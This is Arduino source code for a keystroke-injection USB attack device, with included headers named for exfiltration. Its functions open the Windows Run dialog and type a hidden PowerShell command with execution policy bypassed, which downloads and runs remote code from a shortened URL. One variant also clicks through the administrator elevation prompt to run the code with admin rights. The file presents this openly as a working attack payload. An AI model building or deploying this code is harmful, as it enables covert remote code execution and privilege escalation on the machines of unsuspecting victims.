#include "exfil.h"
#include "phukd.h"

void runRemote(char *IP){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print(F((String("powershell -w h -ep ByPass \"IEX(iwr('")+IP+"'))\"").c_str()));
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.press(KEY_RETURN);
};

void runRemoteAdmin(char *IP){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print(F((String("powershell -w h -ep ByPass \"IEX(iwr('")+IP+"'))\"").c_str()));
  delay(100);
  Keyboard.press(129); // ctrl
  Keyboard.press(129); // shift
  Keyboard.press(KEY_RETURN); // enter
  Keyboard.releaseAll();

  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.press(KEY_RETURN);
};

void payload() {
  delay(10000);
  runRemote("is.gd/tuioh");
}
